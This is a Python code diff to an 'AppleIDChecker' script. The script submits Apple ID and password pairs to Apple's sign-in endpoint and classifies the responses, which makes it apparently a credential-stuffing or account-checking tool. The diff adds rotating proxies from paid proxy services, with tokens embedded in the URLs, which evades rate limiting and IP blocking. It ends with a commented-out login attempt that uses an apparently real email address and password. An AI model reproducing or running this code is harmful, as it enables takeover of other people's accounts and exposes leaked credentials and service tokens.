@@ -9,6 +9,8 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # Constants
+# PROXY_API_URL = 'https://proxyapi.horocn.com/api/v2/proxies?order_id=VWSR1781923674547744&num=1&format=text&line_separator=win&can_repeat=no&user_token=ce551c5cc5516050cb2682d4f59fbae0'
+PROXY_API_URL = 'https://api.hailiangip.com:8522/api/getIpEncrypt?dataType=1&encryptParam=SlDyzgfgDW12vuaMHmQkMzKSlRTuS%2Bu596hwGK%2Fn1zdLwdnbtCj6lZ7A01EG1vOxmvG5TixsGA9ws53lyrDV2TWc1V83TrOf0PxovyU%2BhrnrtCCCN4n199AbybZL3S3VfwKWOgbx%2BXCRKemZTKxtvdkQYlsoImld%2F5vlzY5PF%2FwP9g7Wglmrt2EnuIbvDg0FlYUCoWjGZqpyo%2BRyt5I2dl0tw%2B%2FCVyzsGA8L1XDZpXg%3D'
 URL = 'https://idmsa.apple.com/appleauth/auth/signin'
 HEADERS = {
     "Accept": "application/json, text/javascript, */*; q=0.01",
@@ -30,10 +32,29 @@ class AppleIDChecker:
         self.session = requests.Session()
         self.session.headers.update(HEADERS)
 
+    def get_proxy(self):
+        response = requests.get(PROXY_API_URL)
+        # print(response.text)
+        if response.ok:
+            proxy_ip = response.text.strip()  # Assuming the API returns just the IP:Port in the response body
+            return {
+                "http": f"http://{proxy_ip}",
+                "https": f"http://{proxy_ip}"
+            }
+        else:
+            logger.error("获取代理IP失败。")
+            return None
+
     def try_login(self, apple_id, password):
+        proxy = self.get_proxy()
+        print(proxy)
+        if not proxy:
+            return {"status": "无法获取代理IP，登录请求失败。"}
+
         try:
-            response = self.session.post(URL, json={"accountName": apple_id, "password": password, "rememberMe": False})
-            return self.process_response(apple_id, password, response.text)
+            with lock:  # Ensure only one thread accesses the proxy at a time
+                response = self.session.post(URL, json={"accountName": apple_id, "password": password, "rememberMe": False}, proxies=proxy)
+                return self.process_response(apple_id, password, response.text)
         except requests.RequestException as e:
             logger.error(f'HTTP错误: {e}')
             return {"error": "尝试登录时发生HTTP错误。"}
@@ -54,3 +75,6 @@ class AppleIDChecker:
             result = {"status": "未知错误", "message": "出现未知错误。"}
 
         return result
+
+
+# AppleIDChecker().try_login('thepavlova1991@yandex.ru', '250391Vera')
